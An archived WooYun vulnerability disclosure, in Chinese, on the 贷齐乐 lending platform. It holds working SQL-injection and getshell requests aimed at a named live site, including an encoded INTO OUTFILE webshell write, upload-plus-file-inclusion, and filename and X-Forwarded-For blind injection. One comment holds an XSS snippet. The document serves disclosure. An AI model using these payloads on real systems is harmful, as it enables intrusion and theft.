{"id": 71214, "wybug_id": "wooyun-2015-0136418", "wybug_title": "贷齐乐某5处注入&amp;&amp;两处getshell", "wybug_corp": "chinaanhe.com", "wybug_author": "′雨。", "wybug_date": "2015-08-24 09:57", "wybug_open_date": "2015-11-22 14:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向公众公开  简要描述： 部分无需登录、以你们引以为傲的案例来测试。 详细说明：  增加了全局的过滤 和 addslashes,比较6 但是呢?用你们引以为傲的宁波贷来测试。0x01 注入1在index.php中\nelseif ($_G['query_site'] == \"integral\" || strstr($_G['query_site'],'integral')){\tinclude_once (\"modules/integral/integral_mall.php\");\t//$magic->display(\"integral.html\");\texit;}\n来看看这个小宝贝文件里的代码\nelseif ($_U['query_class'] == 'check_email'){\t\t$email = urldecode($_REQUEST['email']);\t\t$sql = \"select * from {user} where email='{$email}'\";\t\t$result = $mysql->db_fetch_array($sql);\t\t\tif ($result == false){\t\t\techo true;exit;\t\t}else{\t\t\techo false;exit;\t\t}\t}\n巧妙的解码,然后带入,我喜欢。www.nbdai0574.comPOST：query_site=integral&q=action/check_email&email=%2527提示:MySQL错误信息：参数非法!如何注入呢 直接POST以下包 直接写shell。query_site=integral&q=action/check_email&email=%25%32%37%25%32%30%25%36%31%25%36%45%25%36%34%25%32%30%25%33%30%25%32%30%25%35%35%25%34%45%25%34%39%25%34%46%25%34%45%25%32%30%25%35%33%25%34%35%25%34%43%25%34%35%25%34%33%25%35%34%25%32%30%25%33%30%25%37%38%25%33%33%25%34%33%25%33%33%25%34%36%25%33%37%25%33%30%25%33%36%25%33%38%25%33%37%25%33%30%25%33%32%25%33%30%25%33%36%25%33%31%25%33%37%25%33%32%25%33%37%25%33%32%25%33%36%25%33%31%25%33%37%25%33%39%25%33%35%25%34%36%25%33%36%25%34%34%25%33%36%25%33%31%25%33%37%25%33%30%25%33%32%25%33%38%25%33%32%25%33%32%25%33%36%25%33%31%25%33%37%25%33%33%25%33%37%25%33%33%25%33%36%25%33%35%25%33%37%25%33%32%25%33%37%25%33%34%25%33%32%25%33%32%25%33%32%25%34%33%25%33%32%25%33%38%25%33%36%25%33%31%25%33%37%25%33%32%25%33%37%25%33%32%25%33%36%25%33%31%25%33%37%25%33%39%25%33%32%25%33%39%25%33%32%25%33%34%25%33%35%25%34%36%25%33%35%25%33%32%25%33%34%25%33%35%25%33%35%25%33%31%25%33%35%25%33%35%25%33%34%25%33%35%25%33%35%25%33%33%25%33%35%25%33%34%25%33%35%25%34%32%25%33%32%25%33%37%25%33%37%25%33%39%25%33%37%25%33%35%25%33%32%25%33%37%25%33%35%25%34%34%25%33%32%25%33%39%25%33%33%25%34%32%25%33%33%25%34%36%25%33%33%25%34%35%25%32%43%25%33%32%25%32%43%25%33%33%25%32%43%25%33%34%25%32%43%25%33%35%25%32%43%25%33%36%25%32%43%25%33%37%25%32%43%25%33%38%25%32%43%25%33%39%25%32%43%25%33%31%25%33%30%25%32%43%25%33%31%25%33%31%25%32%43%25%33%31%25%33%32%25%32%43%25%33%31%25%33%33%25%32%43%25%33%31%25%33%34%25%32%43%25%33%31%25%33%35%25%32%43%25%33%31%25%33%36%25%32%43%25%33%31%25%33%37%25%32%43%25%33%31%25%33%38%25%32%43%25%33%31%25%33%39%25%32%43%25%33%32%25%33%30%25%32%43%25%33%32%25%33%31%25%32%43%25%33%32%25%33%32%25%32%43%25%33%32%25%33%33%25%32%43%25%33%32%25%33%34%25%32%43%25%33%32%25%33%35%25%32%43%25%33%32%25%33%36%25%32%43%25%33%32%25%33%37%25%32%43%25%33%32%25%33%38%25%32%43%25%33%32%25%33%39%25%32%43%25%33%33%25%33%30%25%32%43%25%33%33%25%33%31%25%32%43%25%33%33%25%33%32%25%32%43%25%33%33%25%33%33%25%32%43%25%33%33%25%33%34%25%32%43%25%33%33%25%33%35%25%32%43%25%33%33%25%33%36%25%32%43%25%33%33%25%33%37%25%32%43%25%33%33%25%33%38%25%32%43%25%33%33%25%33%39%25%32%43%25%33%34%25%33%30%25%32%43%25%33%34%25%33%31%25%32%43%25%33%34%25%33%32%25%32%43%25%33%34%25%33%33%25%32%43%25%33%34%25%33%34%25%32%43%25%33%34%25%33%35%25%32%43%25%33%34%25%33%36%25%32%43%25%33%34%25%33%37%25%32%43%25%33%34%25%33%38%25%32%43%25%33%34%25%33%39%25%32%43%25%33%35%25%33%30%25%32%43%25%33%35%25%33%31%25%32%43%25%33%35%25%33%32%25%32%43%25%33%35%25%33%33%25%32%30%25%36%39%25%36%45%25%37%34%25%36%46%25%32%30%25%36%46%25%37%35%25%37%34%25%36%36%25%36%39%25%36%43%25%36%35%25%32%30%25%32%37%25%32%46%25%37%35%25%37%33%25%37%32%25%32%46%25%37%33%25%36%38%25%36%31%25%37%32%25%36%35%25%32%46%25%36%45%25%36%37%25%36%39%25%36%45%25%37%38%25%32%46%25%36%38%25%37%34%25%36%44%25%36%43%25%32%46%25%37%39%25%37%35%25%33%31%25%32%45%25%37%30%25%36%38%25%37%30%25%32%37%25%32%33直接写入了yu1.php0x02 注入2依旧integral_mall\n}else{\t//礼品兑换列表\t$data_list['page'] = $_REQUEST['page'];\t$data_list['epage'] = 20;\t$data_list['name'] = isset($_REQUEST['name'])?$_REQUEST['name']:\"\";\t$data_list['price'] = empty($_REQUEST['price'])?'':$_REQUEST['price'];\t$data_list['type'] = empty($_REQUEST['type'])?'':$_REQUEST['type'];\t$data_list['order'] = empty($_REQUEST['order'])?'':$_REQUEST['order'];\t$data_list['k'] = empty($_REQUEST['k'])?'':urldecode($_REQUEST['k']);\t$_A['product_k'] = $data_list['k'];\tif(empty($data_list['order'])){\t\t$_A['default_order'] = 1;\t\t$_A['inte_order'] = 1;\t\t$_A['time_order'] = 1;\t\t$_A['order_type'] = 'default';\t}else{\t\t$_order_arr = explode(',',$data_list['order']);\t\tswitch($_order_arr[0]){\t\t\tcase 'default':\t\t\t\tif($_order_arr[1]==1){\t\t\t\t\t$_A['default_order'] = 0;\t\t\t\t}else{\t\t\t\t\t$_A['default_order'] = 1;\t\t\t\t}\t\t\t\t$_A['inte_order'] = 0;\t\t\t\t$_A['time_order'] = 0;\t\t\t\t$_A['order_type'] = 'default';    \t\t\tbreak;    \t\tcase 'time':\t\t\t\tif($_order_arr[1]==1){\t\t\t\t\t$_A['time_order'] = 0;\t\t\t\t}else{\t\t\t\t\t$_A['time_order'] = 1;\t\t\t\t}\t\t\t\t$_A['default_order'] = 0;\t\t\t\t$_A['inte_order'] = 0;\t\t\t\t$_A['order_type'] = 'time';    \t\t\tbreak;    \t\tcase 'inte':\t\t\t\tif($_order_arr[1]==1){\t\t\t\t\t$_A['inte_order'] = 0;\t\t\t\t}else{\t\t\t\t\t$_A['inte_order'] = 1;\t\t\t\t}\t\t\t\t$_A['default_order'] = 0;\t\t\t\t$_A['time_order'] = 0;\t\t\t\t$_A['order_type'] = 'inte';    \t\t\tbreak;    \t}\t\t$_A['product_order'] = $data_list['order'];\t}\tif(!empty($_REQUEST['price'])){\t\t$_A['product_price'] = $_REQUEST['price'];\t}\tif(!empty($_REQUEST['type'])){\t\t$_A['product_type'] = $_REQUEST['type'];\t}\t$result = integralClass::GetList($data_list);\n当检测不存在product的时候进入。又看到美丽的解码 我喜欢。www.nbdai0574.comPOST：query_site=integral&q=action/xxx&k=%2527注入方法如1。0x03 Getshell 1在modules/member/index_default中\n//用户中心的管理地址$member_url = \"index.php?\".$_G['query_site'];$_U['member_url'] = $member_url;//模块，分页，每页显示条数$_U['page'] = empty($_REQUEST['page'])?\"1\":$_REQUEST['page'];//分页$_U['epage'] = empty($_REQUEST['epage'])?\"10\":$_REQUEST['epage'];//分页的每一页//对地址栏进行归类$q = empty($_REQUEST['q'])?\"\":urldecode($_REQUEST['q']);//获取内容 解码$_q = explode(\"/\",$q);$_U['query'] = $q;$_U['query_sort'] = empty($_q[0])?\"main\":$_q[0];$_U['query_class'] = empty($_q[1])?\"list\":$_q[1];//注意这里$_U['query_type'] = empty($_q[2])?\"list\":$_q[2];$_U['query_url'] = $_U['member_url'].\"&q={$_U['query_sort']}/{$_U['query_class']}\"; $_U['user_reg_key'] = \"asdfaswerwer\";\n继续往下看 \n}elseif ($_U['query_sort'] == \"code\"){\t\tif  (!isset($_G['user_id']) || $_G['user_id']==\"\"){\t\t\theader('location:index.php?user&q=action/login');\t}\t\tif (is_file(ROOT_PATH.\"/modules/{$_U['query_class']}/{$_U['query_class']}.inc.php\")){\t\tinclude(ROOT_PATH.\"/modules/{$_U['query_class']}/{$_U['query_class']}.inc.php\");\t}else{\t\t$msg = array(\"您操作有误，请勿乱操作\");\t}\n包含了。 但是在上面是 $_q = explode(\"/\",$q);用/ 来切割成数组, 所以我们如果要向上跳目录的话,就只有用..\\了这个好像是只有windows支持?因为解码了,所以无视gpc 受php版本限所以我们找个windows的daiqile直接用demo的来测试。121.40.166.230:10025首先我们先找个上传图片的地方上传一个图片的phpinfo\nPOST /plugins/editor/sinaeditor/editor/upload.php?action=upload HTTP/1.1Host: 121.40.166.230:10025User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveCookie: uchome_auth=3838UNlcYHqf9iB3IPbJz1s5PGZ0svPTcikiYKRylegS37m7en4wgaGw0QY%2BUoNGpacjkaJAzePH8ClrW4EJ;Content-Type: multipart/form-data; boundary=---------------------------2995119424827Content-Length: 202-----------------------------2995119424827Content-Disposition: form-data; name=\"file1\"; filename=\"a.jpg\"Content-Type: image/jpeg<?php phpinfo();?>-----------------------------2995119424827--\n返回 <script>window.parent.LoadIMG('../../../data/upfiles/201508231440326040.jpg');</script>http://121.40.166.230:10025/data/upfiles/201508231440326040.jpg然后来包含这个文件。http://121.40.166.230:10025/?user  首先登录会员 xiaoyu xiaoyu再来包含虽然全局转义了 但是利用二次编码绕过http://121.40.166.230:10025/?userPOST：q=code/%25%32%45%25%32%45%25%35%43%25%36%34%25%36%31%25%37%34%25%36%31%25%35%43%25%37%35%25%37%30%25%36%36%25%36%39%25%36%43%25%36%35%25%37%33%25%35%43%25%33%32%25%33%30%25%33%31%25%33%35%25%33%30%25%33%38%25%33%32%25%33%33%25%33%31%25%33%34%25%33%34%25%33%30%25%33%33%25%33%32%25%33%36%25%33%30%25%33%34%25%33%30%25%32%45%25%36%41%25%37%30%25%36%37%25%30%30\n\n成功执行了我们上传的jpg0x04 Getshell 2在modules\\integral\\integral_mall.php中\n//模块，分页，每页显示条数$_U['page'] = empty($_REQUEST['page'])?\"1\":$_REQUEST['page'];//分页$_U['epage'] = empty($_REQUEST['epage'])?\"10\":$_REQUEST['epage'];//分页的每一页//对地址栏进行归类$q = empty($_REQUEST['q'])?\"\":urldecode($_REQUEST['q']);//获取内容$_q = explode(\"/\",$q);$_U['query'] = $q;$_U['query_sort'] = empty($_q[0])?\"main\":$_q[0];$_U['query_class'] = empty($_q[1])?\"list\":$_q[1];$_U['query_type'] = empty($_q[2])?\"list\":$_q[2];$_U['query_url'] = $_U['member_url'].\"&q={$_U['query_sort']}/{$_U['query_class']}\";\n下面 \n}elseif ($_U['query_sort'] == \"code\"){\tif  (!isset($_G['user_id']) || $_G['user_id']==\"\"){\t\t//微信登录\t\tif(strstr($_SERVER['REQUEST_URI'],'/wx/') || !empty($_REQUEST['wx'])){\t\t\theader('location:index.php?user&q=action/login&wx=1');\t\t}else{\t\t\theader('location:index.php?user&q=action/login');\t\t}\t}\t\tif (is_file(ROOT_PATH.\"/modules/{$_U['query_class']}/{$_U['query_class']}.inc.php\")){\t\tinclude(ROOT_PATH.\"/modules/{$_U['query_class']}/{$_U['query_class']}.inc.php\");\t}else{\t\t$msg = array(\"您操作有误，请勿乱操作\");\t}\n跟上面那个是一样的 访问方式如上面的注入。 这个我就不多说了0x05 注入 3/plugins/jquery.uploadify/uploadify.php中\n$save_path1 = \"../../\";$save_path2 = \"data/upfiles/userimg/\";$targetFolder = $save_path1 . $save_path2; // Relative to the root//不存在就创建文件夹createFolder($targetFolder);$verifyToken = md5('unique_salt' . $_POST['timestamp']);//验证token   这里我们的post不提交 则token为一个固定的值if (!empty($_FILES) && $_POST['token'] == $verifyToken) {\t$tempFile = $_FILES['Filedata']['tmp_name'];\t$targetPath = $_SERVER['DOCUMENT_ROOT'] . $targetFolder;\t$file_name = $_FILES['Filedata']['name'];\t$file_name = \"pic\".mktime().rand(0,999). rechinese($file_name);//获取了名字。\t\t$targetFile = $targetFolder . $file_name;\t\t// Validate the file type\t$fileTypes = array('jpg','jpeg','gif','png'); // File extensions\t\t$fileParts = pathinfo($file_name);\t\tif (in_array($fileParts['extension'],$fileTypes)) {//验证了后缀\t\tif(move_uploaded_file($tempFile,$targetFile)){\t\t\t$data[\"img\"]=$save_path2.$file_name;\t\t\t$data[\"auctionid\"]=0;\t\t\tif(isset($_POST[\"reloadid\"])&&$_POST[\"reloadid\"]!==\"0\"){\t\t\t\t$sql = \"update `{attestation}` set `addtime` = '\" . time () . \"',`addip` = '\" . ip_address () . \"'\";\t\t\t\tforeach ( $data as $key => $value ) {\t\t\t\t\t$sql .= \",`$key` = '$value'\";\t\t\t\t}\t\t\t\t$sql.=\" where id={$_POST[\"reloadid\"]}\";\t\t\t}else{\t\t\t\t$sql = \"insert into `{attestation}` set `addtime` = '\" . time () . \"',`addip` = '\" . ip_address () . \"'\";\t\t\t\tforeach ( $data as $key => $value ) {\t\t\t\t\t$sql .= \",`$key` = '$value'\";\t\t\t\t}//foreach出来\t\t\t}\t\t\t\t\t\t\t\t\t$result=$mysql->db_query ( $sql );\t\t\tif ($result) {\t\t\t\t//返回插入的id\t\t\t\tif(isset($_POST[\"reloadid\"])&&$_POST[\"reloadid\"]!==\"0\" ){\t\t\t\t\techo json_encode(array(\"id\"=>$_POST[\"reloadid\"],\"filename\"=>$file_name));\t\t\t\t}else{\t\t\t\t\techo json_encode(array(\"id\"=>$mysql->db_insert_id(),\"filename\"=>$file_name));\t\t\t\t\t\t\t\t\t\t}\t\t\t} else {\n可以看到 这里虽然上传的时候限制了后缀,但是后面foreach出来 也就是在上传的时候带入了文件的名字 导致了注入。_FILES 的 无视了这个过滤。用你们的 www.nbdai0574.com 测试\nPOST /plugins/jquery.uploadify/uploadify.php HTTP/1.1Host: www.nbdai0574.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveCookie: uchome_auth=3838UNlcYHqf9iB3IPbJz1s5PGZ0svPTcikiYKRylegS37m7en4wgaGw0QY%2BUoNGpacjkaJAzePH8ClrW4EJ;Content-Type: multipart/form-data; boundary=---------------------------29862134505396Content-Length: 318-----------------------------29862134505396Content-Disposition: form-data; name=\"token\"6b79a77180e9ec3a7ca351ebe54641a2-----------------------------29862134505396Content-Disposition: form-data; name=\"Filedata\"; filename=\"a'.jpg\"Content-Type: image/jpega-----------------------------29862134505396--\n\nHTTP/1.1 200 OKServer: nginx/1.4.7Date: Sun, 23 Aug 2015 03:56:41 GMTContent-Type: text/html;charset=GB2312Connection: keep-aliveSet-Cookie: PHPSESSID=is7r2ov3530pdou3r7fkbj4g90; path=/Content-Length: 24MySQL´íÎóÐÅÏ¢£º²ÎÊý·Ç·¨!\n 提示mysql非法了 这就是报错的标志 说明了成功引入了单引号 这个来用盲注入\nPOST /plugins/swfupload/upload.array.php HTTP/1.1Host: www.nbdai0574.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveCookie: uchome_auth=3838UNlcYHqf9iB3IPbJz1s5PGZ0svPTcikiYKRylegS37m7en4wgaGw0QY%2BUoNGpacjkaJAzePH8ClrW4EJ;Content-Type: multipart/form-data; boundary=---------------------------10383149458909Content-Length: 376-----------------------------10383149458909Content-Disposition: form-data; name=\"token\"6b79a77180e9ec3a7ca351ebe54641a2-----------------------------10383149458909Content-Disposition: form-data; name=\"Filedata\"; filename=\"1' or if(ascii(substr((select user()),1,1))=114,sleep(2),1)#.jpg\"Content-Type: image/jpeg1-----------------------------10383149458909--\n当user()的第一位的ascii为114的时候则延时, 测试宁波贷114的时候成功延时说明user()的第一位为r0x06 注入plugins/swfupload/upload.array.php中\n$valid_chars_regex = '.A-Z0-9_ !@#$%^&()+={}\\[\\]\\',~`-'; // Characters allowed in the file name (in a Regular Expression format)$save_path1 = \"../../\";$save_path2 = \"data/upfiles/litpics/\";$save_path = $save_path1 . $save_path2;$file_name = $_FILES [\"Filedata\"] [\"name\"];// Validate that we won't over-write an existing fileif (file_exists ( $save_path . $file_name )) {\t//HandleError ( \"File with this name already exists\" );\texit ( 0 );}$file_name = \"pic\" . mktime ().rand(0,999) . rechinese ( $file_name );//只清除了一些中文名 无影响// Validate file extension$path_info = pathinfo ( $file_name );$file_extension = $path_info [\"extension\"];//获取后缀$is_valid_extension = false;foreach ( $extension_whitelist as $extension ) {//验证后缀\tif (strcasecmp ( $file_extension, $extension ) == 0) {\t\t$is_valid_extension = true;\t\tbreak;\t}}if (! $is_valid_extension) {\t//HandleError ( \"Invalid file extension\" );\texit ( 0 );}if (! @move_uploaded_file ( $_FILES [\"Filedata\"] [\"tmp_name\"], $save_path . $file_name )) {\techo \"faild!\";\texit ( 0 );} else {\t\t// 直接用户名查询userid，目前不了解怎么\t//$sql1 = \"select user_id from {user}  where username='\" . $_SESSION ['username'] . \"'\";\t//$res1 = $mysql->db_fetch_array ( $sql1 );\t//print_r ( $res1 );\t// userid\t$data ['user_id'] = $userid;\t\t$_G ['upimg'] ['file'] = \"pics\";\t$_G ['upimg'] ['cut_status'] = 0;\t$_G ['upimg'] ['code'] = \"attestation\";\t$data ['type_id'] = 1;\t$data ['name'] = $file_name;\t\t$data ['litpic'] = $save_path2 . $file_name;\t\t$sql = \"insert into `{attestation}` set `addtime` = '\" . time () . \"',`addip` = '\" . ip_address () . \"'\";\tforeach ( $data as $key => $value ) {\t\t$sql .= \",`$key` = '$value'\";\t}\t$result = $mysql->db_query ( $sql );\t\tif ($result !== true) {\t\techo \"failed\";\t} else {\t\techo \"success\";\t}\n如果是合法的图片后缀就带入到sql当中 因为是_FILES 无视全局的全部过滤。\nPOST /plugins/swfupload/upload.array.php HTTP/1.1Host: www.nbdai0574.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveCookie: uchome_auth=3838UNlcYHqf9iB3IPbJz1s5PGZ0svPTcikiYKRylegS37m7en4wgaGw0QY%2BUoNGpacjkaJAzePH8ClrW4EJ;Content-Type: multipart/form-data; boundary=---------------------------29862134505396Content-Length: 318-----------------------------29862134505396Content-Disposition: form-data; name=\"token\"6b79a77180e9ec3a7ca351ebe54641a2-----------------------------29862134505396Content-Disposition: form-data; name=\"Filedata\"; filename=\"a'.jpg\"Content-Type: image/jpega-----------------------------29862134505396--\n提交后返回  提示:MySQL错误信息：参数非法!说明成功引入了单引号。 注入方法如0X05 不多说0x07 通用函数造成的一大堆注入\nfunction ip_address() {\tif(!empty($_SERVER[\"HTTP_CLIENT_IP\"])) {\t\t$ip_address = $_SERVER[\"HTTP_CLIENT_IP\"];\t}else if(!empty($_SERVER[\"HTTP_X_FORWARDED_FOR\"])){\t\t$ip_address = array_pop(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']));\t}else if(!empty($_SERVER[\"REMOTE_ADDR\"])){\t\t$ip_address = $_SERVER[\"REMOTE_ADDR\"];\t}else{\t\t$ip_address = '';\t}\treturn $ip_address;}\n很古老的xff漏洞, 但是xff中的逗号用来切割了, 这用我们用Clientip这个通用函数造成了一大堆注入。。随便列举几处\nPOST /plugins/swfupload/upload.array.php HTTP/1.1Host: www.nbdai0574.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3x-forwarded-for:Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveCookie: uchome_auth=3838UNlcYHqf9iB3IPbJz1s5PGZ0svPTcikiYKRylegS37m7en4wgaGw0QY%2BUoNGpacjkaJAzePH8ClrW4EJ;Content-Type: multipart/form-data; boundary=---------------------------10383149458909Content-Length: 339-----------------------------10383149458909Content-Disposition: form-data; name=\"token\"6b79a77180e9ec3a7ca351ebe54641a2-----------------------------10383149458909Content-Disposition: form-data; name=\"Filedata\"; filename=\"8_3M[__GP4JQURNQG0JXX0S.jpg\"Content-Type: image/jpeg1-----------------------------10383149458909--\n返回success更改xff为1' select from 就报错了。。\n\n不多说了 xff这个 很多处。注入方法也如0x05   漏洞证明：  \n\n利用注入写的shell 刚上的。   修复方案：  该继续转义的就转义 验证合法   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-08-24 14:36 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-24 10:08 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1159 漏洞数:208        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  我擦，前排！！！    \n     2015-08-24 10:08 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:798 漏洞数:99        )\t\t \n  已跪    \n     2015-08-24 10:11 |    \t\txy0er \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:8        | x)\t\t \n  叼叼啊。    \n     2015-08-24 10:12 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:245 漏洞数:63        | 潜心代码审计。)\t\t \n  跪了    \n     2015-08-24 10:15 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:455 漏洞数:53        | 猜猜我是谁？)\t\t \n  又打脸，都说了大屁股啊    \n     2015-08-24 10:22 |    \t\tmissy \t\t\t( 普通白帽子  |\t\t\t        Rank:719 漏洞数:201        | .....-3-3-3-3-3-3-3-3-3-3-3-3-3)\t\t \n  幸福啪啪啪。    \n     2015-08-24 10:23 |    \t\t继续沉默 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 好好学习，天天向上)\t\t \n  又打脸，这个厂商真是作死    \n     2015-08-24 10:31 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  雨神又开撸了    \n     2015-08-24 11:14 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1213 漏洞数:321        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  雨神又开撸了    \n     2015-08-24 11:44 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1317 漏洞数:191        | 。)\t\t \n  又是rmb    \n     2015-08-24 13:37 |    \t\tTr0jan \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:3        | 关注网络安全)\t\t \n  V2015.8.10 我们邀请了国内著名的白帽团队高压测试，久经考验，然依然毫发无损，让白帽团队也不断点赞！更是凭借自身的实力获得了众多的客户好评，我们客户之中过亿元交易额的有数十家，这是最好的证明。希望使用正版贷齐乐系统的客户一如既往的支持我们，同时，也希望使用贷齐乐盗版的客户，希望你们远离盗版，尽快更换贷齐乐正版系统，否则你们将受到黑客的侵扰，再请求我们到时就晚了，损失的可不是仅仅一套系统的价格这样简单，失去的更是客户的人心。与此同时，我们也保留了我们起诉使用贷齐乐盗版系统客户的权利。V2015.8.10版贷齐乐依然是高性能、高抗压，超出意外的体验，全方位安全防御无死角，屏蔽了常规的sql、注入、上传、跨站、弱口令，同时有定时巡航检测体系，防木马、防黑客。贷齐乐作为网贷系统行业的“领头羊”，贷齐乐人甘愿为我们的客户做“嫁衣”。最后，请客户在选择系统的时候，一定要擦亮眼睛，不要被盗版蒙骗，选择正版系统！使用盗版系统的客户最终也将自食其果，终伤害的是自己。同时，也警告以某蒙为代表的竞争对手，恶意借黑客攻击盗版贷齐乐系统，恶意诋毁行业霸主贷齐乐正版客户的行为，以贷齐乐之名气来炒作自己的行为、非正常营销和诬蔑行为，我们已经安排律师团对对其进行公诉。     \n     2015-08-24 13:50 |    \t\ttzwx \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 吴邪仍在，不见天真)\t\t \n  看个热闹    \n     2015-08-24 14:50 |    \t\t爱神 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | Qq190290957)\t\t \n  @Tr0jan 打脸。    \n     2015-08-24 15:23 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @疯狗  狗哥求审核 http://www.wooyun.org/bugs/wooyun-2015-0135577/trace/ff0fc16d321e35452b8216ff77bd0acc    \n     2015-11-17 16:35 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1056 漏洞数:184        | WooYun is the Bigest gay place :))\t\t \n  看完以后，受益匪浅.，楼主666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}